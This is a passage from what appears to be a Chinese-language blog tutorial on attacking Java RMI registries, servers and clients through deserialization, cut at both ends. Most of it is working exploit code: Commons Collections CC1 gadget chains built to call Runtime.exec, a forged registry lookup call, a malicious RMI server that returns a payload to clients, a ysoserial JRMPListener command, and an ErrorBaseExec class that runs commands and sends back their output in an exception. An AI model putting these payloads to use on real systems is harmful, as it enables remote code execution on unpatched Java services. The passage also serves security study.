class="keyword">catch</span> (IOException var81) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var81);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var82) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var82);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.unbind(var7);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var80) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var80);</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>

<p><code>unbind</code>和<code>lookup</code>的攻击手法是一样的，我们这里用<code>lookup</code>来分析</p>
<p>实际上这两者的攻击思路和<code>bind/rebind</code>是相类似的，但是<code>lookup</code>这里只能传入<code>String</code>字符串，我们可以通过伪造<code>lookup</code>连接请求利用，修改<code>lookup</code>方法，使其可以传入对象</p>
<p>我们想要修改<code>lookup</code>方法，就要知道它的内部原理</p>
<p>其实我们从try–catch结构来看，就知道哪里是重要代码了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Remote <span class="title function_">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> AccessException, NotBoundException, RemoteException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">super</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">                var3.writeObject(var1);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var18) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, var18);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">super</span>.ref.invoke(var2);</span><br><span class="line"></span><br><span class="line">            Remote var23;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectInput</span> <span class="variable">var6</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">                var23 = (Remote)var6.readObject();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var15) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, var15);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException var16) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, var16);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="built_in">super</span>.ref.done(var2);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> var23;</span><br><span class="line">        &#125;......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>重要的代码有以下几条，这里我们重点看传输部分</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//传输</span></span><br><span class="line"><span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">super</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line"><span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">var3.writeObject(var1);</span><br><span class="line"><span class="built_in">super</span>.ref.invoke(var2);</span><br><span class="line"></span><br><span class="line"><span class="comment">//接收</span></span><br><span class="line"><span class="type">ObjectInput</span> <span class="variable">var6</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">var23 = (Remote)var6.readObject();</span><br></pre></td></tr></table></figure>

<p>我们这里只需要想办法去获取<code>newCall</code>中的super.ref和operations，就能去伪造一个<code>lookup</code>请求</p>
<p>别的师傅通过反射来获取<code>operations</code>，我找到<code>operations</code>赋值地方，我这里直接用这个赋值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Operation[] operations = <span class="keyword">new</span> <span class="title class_">Operation</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void bind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;java.lang.String list()[]&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;java.rmi.Remote lookup(java.lang.String)&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void rebind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void unbind(java.lang.String)&quot;</span>)&#125;;</span><br></pre></td></tr></table></figure>

<p>通过调试，我找到了super.ref的地方（比较笨，只能通过调试来）</p>
<p>registry中的第一个属性</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741234993088-1f7624fe-41d6-4693-9dce-0bae89f29bc9.png"></p>
<p>通过反射获取<code>Field</code>数组，从中找到<code>UnicastRef</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();</span><br><span class="line">        fields_0[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef) fields_0[<span class="number">0</span>].get(registry);</span><br></pre></td></tr></table></figure>

<p>EXP如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) CC1();</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(</span><br><span class="line">                Remote.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, handler));</span><br><span class="line"></span><br><span class="line">        Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();</span><br><span class="line">        fields_0[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef) fields_0[<span class="number">0</span>].get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取operations</span></span><br><span class="line"></span><br><span class="line">        Operation[] operations = <span class="keyword">new</span> <span class="title class_">Operation</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void bind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;java.lang.String list()[]&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;java.rmi.Remote lookup(java.lang.String)&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void rebind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void unbind(java.lang.String)&quot;</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 伪造lookup的代码，去伪造传输信息</span></span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">        var3.writeObject(remote);</span><br><span class="line">        ref.invoke(var2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">CC1</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class), <span class="comment">// 构造 setValue 的可控参数</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span></span><br><span class="line">                        , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;drunkbaby&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> aihConstructor.newInstance(Target.class, transformedMap);</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741235203120-8fee3282-6d59-4544-929f-b65888540294.png"></p>
<h3 id="m4BD5">攻击客户端</h3>
我们之前分析过，在客户端中，在`unmarshalValue()`方法中，存在着入口

<h4 id="HqfBW">注册中心攻击客户端</h4>
对于注册中心看，我们还是上面说的那几种方式触发

<p>除了<code>unbind</code>和<code>rebind</code>方法，都会返回数据给客户端，当序列化数据到了客户端时就会反序列化，我们需要控制注册中心返回的数据，就可以实现对客户端的攻击</p>
<p>我们使用ysoserial的JRMPListener，命令如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -cp .\ysoserial-all.jar ysoserial.exploit.JRMPListener <span class="number">1099</span> CommonsCollections1 <span class="string">&#x27;calc&#x27;</span></span><br></pre></td></tr></table></figure>

<p>然后使用客户端访问</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        registry.list();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741236357004-9b8823fc-3f07-42cf-8edb-d410a8973acd.png"></p>
<h4 id="CYWBr">服务端攻击客户端</h4>
服务端攻击客户端，通过 服务端返回Object对象 来攻击

<p>传递回来不一定是基础数据类型（String，int），也有可能是对象，当服务端返回给客户端一个对象时，客户端就要进行对应的反序列化操作。</p>
<p>我们需要伪造一个服务器，当客户端调用某个远程方法时，返回的参数是我们的恶意对象</p>
<p>服务端接口类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteObj</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String keywords)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务端接口实现类，返回CC1<code>Object</code>对象（这里不是很懂，对handler的封装是怎么个事）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">RemoteObjImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers =  <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (Object) handler;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务端创建注册中心并绑定</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">RemoteObjImpl</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;remoteObj&quot;</span>,remoteObj);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>用服务器对客户端进行远程方法的调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (IRemoteObj)registry.lookup(<span class="string">&quot;remoteObj&quot;</span>);</span><br><span class="line">        remoteObj.sayHello();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741240065969-7dc13f4f-b314-4d7f-9d3c-862069ffdcec.png"></p>
<h3 id="fKBWM">攻击服务端</h3>
<h4 id="WqRvB">客户端攻击服务端</h4>
+ jdk 1.7
+ CC3.2.1依赖
+ RMI提供的数据类型有Object类型

<p>服务端代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VictimServer</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteObj</span> &#123;  </span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">RemoteHelloWorld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;  </span><br><span class="line">            <span class="built_in">super</span>();  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;  </span><br><span class="line">            System.out.println(<span class="string">&quot;调用了hello方法&quot;</span>);  </span><br><span class="line"> <span class="keyword">return</span> <span class="string">&quot;Hello world&quot;</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">evil</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> RemoteException &#123;  </span><br><span class="line">            System.out.println(<span class="string">&quot;调用了evil方法，传递对象为：&quot;</span>+obj);  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String keywords)</span> <span class="keyword">throws</span> RemoteException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">RemoteHelloWorld</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>();  </span><br><span class="line"> LocateRegistry.createRegistry(<span class="number">1099</span>);  </span><br><span class="line"> Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, h);  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">VictimServer</span>().start();  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Server.IRemoteHelloWorld;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> Server.IRemoteHelloWorld;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">IRemoteHelloWorld</span> <span class="variable">r</span> <span class="operator">=</span> (IRemoteHelloWorld) Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>);</span><br><span class="line">        r.evil(getpayload());</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"> </span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;lala&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, transformerChain);</span><br><span class="line"> </span><br><span class="line">        <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> ctor.newInstance(Target.class, transformedMap);</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>应该是传输Object对象过程中，需要反序列化导致的攻击吧</p>
<h2 id="npCPT">RMI进阶攻击方式</h2>
<h3 id="pmpDZ">URLClassLoader实现回显攻击</h3>
攻击注册中心时，注册中心遇到异常时，会直接把异常发回来，这里我们利用URLClassLoader远程加载jar/class文件，传入服务端，反序列化调用其任意方法，在方法内抛出错误，错误返回客户端

<p>远程Dome</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ErrorBaseExec</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doExec</span><span class="params">(String args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">exec</span> <span class="operator">=</span> Runtime.getRuntime().exec(args);</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(exec.getInputStream()));</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">stringBuffer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = bufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            stringBuffer.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> stringBuffer.toString();</span><br><span class="line">        <span class="type">Exception</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Exception</span>(result);</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>制作jar包命令如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javac ErrorBaseExec.java</span><br><span class="line">jar -cvf RMIexploit.jar ErrorBaseExec.class</span><br></pre></td></tr></table></figure>

<p>客户端Poc如下</p>
